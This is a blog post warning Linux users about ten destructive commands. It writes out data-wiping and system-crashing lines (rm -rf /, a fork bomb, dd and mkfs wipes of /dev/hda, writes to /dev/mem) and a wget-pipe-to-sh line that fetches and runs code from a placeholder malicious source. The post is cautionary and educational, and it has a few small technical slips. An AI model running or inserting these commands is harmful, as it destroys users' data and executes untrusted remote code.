---
layout: post
title: 10 Most Dangerous Commands
subtitle: You Should Never Execute on Linux
bigimg: /img/mostcommands.gif
---

## 10 Most Dangerous Commands
You Should Never Execute on Linux

### 1. rm -rf Command
Commonly known as the recursive delete command, the rm -rf command is one of the fastest way to delete a folder and its contents. But a little typo or ignorance may result into unrecoverable system damage. The some of options used with rm command are.

```
1. rm command in Linux is used to delete files.
2. rm -r command deletes the folder recursively, even the empty folder.
3. rm -f command removes ‘Read only File’ without asking.
4. rm -rf / : Force deletion of everything in root directory.
5. rm -rf * : Force deletion of everything in current directory/working directory.
6. rm -rf . : Force deletion of current folder and sub folders.
```

Hence, be careful when you are executing rm -rf command. To overcome accidental delete of file by ‘rm‘ command, create an alias of ‘rm‘ command as ‘rm -i‘ in ".bashrc" file, it will ask you to confirm every deletion.’

Note, these days on most Linux systems if you tried doing this you’d get a warning. But the warning isn’t guaranteed, so just don’t do it.

## 2. :(){:|:&};: Command
   
This command is actually a fork bomb. It operates by defining a function called ‘:‘, which calls itself twice, once in the foreground and once in the background. It keeps on executing again and again till the system freezes.
   
``` :(){:|:&};: ```

This fork bomb command defines a function named : that recursively calls itself twice when executed. One of the recursive calls happens in the foreground while the other happens in the background.
   
In other words, whenever this function executes, it spawns two child processes. Those child processes spawn their own child processes, and this cycle keeps going in an infinite loop. The only way out of it is to reboot the system.

## 3. Format Hard Drive
   
The terminal is especially tricky for Linux newbies because it provides several ways to accidentally wipe one’s hard drive. Recursive deletion is a big one, but here’s another:
   
> mkfs.ext3 /dev/hda

This command formats the hard drive to use the ext3 filesystem.The above command will format the block ‘sda’ and you would surely be knowing that after execution of the above command your Block (Hard Disk Drive) would be new, BRAND NEW! Without any data, leaving your system into unrecoverable stage.

## 4. Overwrite Hard Drive

Never use this command if your workstation contains life long work. At least disk formatting is an actual procedure with real-life uses; directly overwriting one’s drive, on the other hand, is not so great.

> 'command' > /dev/hda

In the command above, command can be replaced by any Bash command. The > operator redirects the output from the command on its left to the file on its right. In this case, it doesn’t matter what the output of the left command is. That raw data is being redirected and used to overwrite the system hard drive. This renders your Linux PC/laptop useless.

## 5. Wipe Hard Drive
   
   This command will completely wipe out your hard drive. No data corruptions or overwrites; it will literally fill your hard drive with zeroes. While this command can be necessiated if you have to start afresh but wiping your hard drive is a bad idea.
   
> dd if=/dev/zero of=/dev/hda

The dd command is a low-level instruction that’s mostly used to write data to physical drives. The ifparameter determines the source of data, which in this case is **/dev/zero**, a special on Linux that produces an infinite stream of zeroes. The of parameter determines the destination of those zeroes, which is the /dev/hda drive.

## 6. > file Command
   
The above command is used to flush the content of file. If the above command is executed with a typo or ignorance like “> xt.conf” will write the configuration file or any other system or configuration file and lead to a complete breakdown of your PC/workstation.

## 7. Implode Hard Drive
   
For some special reasons, Linux has a special file called **/dev/null** that will discard whatever data is written to it. You can think of it as a black hole or a file shredder: anything given to it as input will be eaten up for good. You must have understood what I was alluding to. Running any command with **/dev/null** can shred that particular data file. However using the **/dev/null** with some other commands can be quite devastating for you.
   
> mv / /dev/null

The above mv command tries to move the system’s root directory **/** into the black hole of **/dev/null**. This is a valid command and the result is devastating: the hard drive gets eaten up and there’s nothing left. Doing this will make your system unusable.

## 8. ^foo^bar
   
   FUBAR stands for **fucked up beyond all recognition/any repair/all reason**. As the name suggests, this command if not used properly can fuck up your system. This command is used to edit the previous run command without the need of retyping the whole command again. But this can really be troublesome if you didn’t take the risk of thoroughly checking the change in original command using **^foo^bar** command.
   
 ## 9. Cause Kernel Panic
    
While Windows has its infamous BSoD or Blue Screen of Death, Linux has a similar Blue Screen which is known as **Kernel Panic**. Sometimes, an internal error occurs from which recovery is impossible, so the system will enact something similar to the Blue Screen: a kernel panic. 

```
dd if=/dev/random of=/dev/port
echo 1 > /proc/sys/kernel/panic
cat /dev/port
cat /dev/zero > /dev/mem
```

If the above commands aren’t important here. What is important is that running any of those lines will result in a kernel panic, forcing you to reboot your system. It’s best to stay away from these commands unless you’re absolutely sure you know what you’re doing.

## 10. Execute Remote Script

Here’s an innocent command that can actually be useful in day-to-day life on a Linux system. **wget** retrieves the contents of a web URL, which can be used to access websites or download files. However, there’s a simple trick that turns it dangerous:

> wget http://an-untrusted-url -O- \| sh
 

**wget http://malicious_source -O- \| sh** command will download a script from a malicious source and then execute it. Wget command will download the script and sh will execute the downloaded script.The above combination downloads the contents of the given URL and immediately feeds it to the **sh** command, which executes the downloaded contents in the terminal. If the URL were to point to a malicious script, you’d be sealing your own fate with this command.

Font [TechWorm](http://www.techworm.net/2016/10/10-lethal-linux-commands-never-execute.html)